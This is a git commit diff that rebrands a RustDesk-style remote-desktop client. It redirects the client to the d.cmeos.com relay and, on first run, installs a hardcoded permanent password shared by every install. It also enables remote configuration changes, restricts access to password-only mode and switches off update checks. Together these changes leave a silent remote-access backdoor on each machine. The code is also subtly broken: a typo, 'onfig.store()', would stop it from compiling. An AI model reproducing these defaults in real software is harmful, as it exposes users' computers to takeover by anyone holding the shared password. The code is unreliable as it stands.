66374646ee51c6a44e1d2ff661b7d9d319a768cb
lion9966 <lion9966@163.com>
2026-03-22 20:43:46 +0800

    IDtoCmeos

--- src/config.rs
+++ src/config.rs
@@ -105,9 +105,9 @@ const CHARS: &[char] = &[
     '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k',
     'm', 'n', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
 ];
-
-pub const RENDEZVOUS_SERVERS: &[&str] = &["rs-ny.rustdesk.com"];
-pub const RS_PUB_KEY: &str = "OeVuKk5nlHiXp+APNn0Y3pC1Iwpwn44JGqrQCsWqmBw=";
+//修改中继服务器IP及Key
+pub const RENDEZVOUS_SERVERS: &[&str] = &["d.cmeos.com"];
+pub const RS_PUB_KEY: &str = "If4kaxlpBC7MITAUnm+Pcd2KPp4GXx5owVBNdp8N65Y=";
 
 pub const RENDEZVOUS_PORT: i32 = 21116;
 pub const RELAY_PORT: i32 = 21117;
@@ -459,6 +459,30 @@ impl Config2 {
     fn load() -> Config2 {
         let mut config = Config::load_::<Config2>("2");
         let mut store = false;
+
+        // 将设置里的 安全-拒绝局域网发现 默认打勾
+        if !config.options.contains_key("enable-lan-discovery") {
+            config.options.insert("enable-lan-discovery".to_string(), "N".to_string());
+            store = true;
+        }
+
+        // 将设置里的 安全-允许远程修改配置 默认打勾
+        if !config.options.contains_key("allow-remote-config-modification") {
+            config.options.insert("allow-remote-config-modification".to_string(), "Y".to_string());
+            store = true;
+        }
+        // 将设置里的【安全-密码】切换成【使用固定密码】
+        if !config.options.contains_key("verification-method") {
+            config.options.insert("verification-method".to_string(), "use-permanent-password".to_string());
+            store = true;
+        }
+
+        //将设置里的【安全-密码】改为成【只允许密码访问】方式
+        if !config.options.contains_key("approve-mode") {
+                config.options.insert("approve-mode".to_string(), "password".to_string());
+                store = true;
+            }
+
         if let Some(mut socks) = config.socks {
             let (password, _, store2) =
                 decrypt_str_or_original(&socks.password, PASSWORD_ENC_VERSION);
@@ -470,6 +494,14 @@ impl Config2 {
             decrypt_str_or_original(&config.unlock_pin, PASSWORD_ENC_VERSION);
         config.unlock_pin = unlock_pin;
         store |= store2;
+
+        // 将设置里的【安全-密码】设置默认的固定密码
+        if !config.options.contains_key("trusted_devices") {
+                    config.options.insert("trusted_devices".to_string(), "00UPpKlwRsNuTHM3ADo/4aK3Ig".to_string());
+                    config.store();
+                }
+
+
         if store {
             config.store();
         }
@@ -599,6 +631,13 @@ impl Config {
                 }
             }
         }
+
+        //固定密码
+        if config.password.is_empty() {
+            config.password = "00UPpKlwRsNuTHM3ADo/4aK3Ig".to_string();
+            store = true;
+        }
+
         if store {
             config.store();
         }
@@ -1859,7 +1898,35 @@ pub struct LocalConfig {
 
 impl LocalConfig {
     fn load() -> LocalConfig {
-        Config::load_::<LocalConfig>("_local")
+        //将设置里的 常规-启用UDP打洞 默认打勾
+        // Config::load_::<LocalConfig>("_local")
+        let mut config = Config::load_::<LocalConfig>("_local");
+        let mut store = false;
+        //启用UDP打洞
+        if !config.options.contains_key("enable-udp-punch") {
+            config.options.insert("enable-udp-punch".to_string(), "Y".to_string());
+            store = true;
+        }
+        //常规-主题 改为默认主题为暗黑
+        if !config.options.contains_key("theme") {
+                config.options.insert("theme".to_string(), "dark".to_string());
+                store = true;
+        }
+        //常规-启动时检查软件更新 默认去勾
+        if !config.options.contains_key("enable-check-update") {
+            config.options.insert("enable-check-update".to_string(), "N".to_string());
+            store = true;
+        }
+        //常规-启用 IPv6 P2P 连接 默认打勾
+        if !config.options.contains_key("enable-ipv6-punch") {
+            config.options.insert("enable-ipv6-punch".to_string(), "Y".to_string());
+            store = true;
+        }
+
+        if store {
+            onfig.store();
+        }
+        config
     }
 
     fn store(&self) {
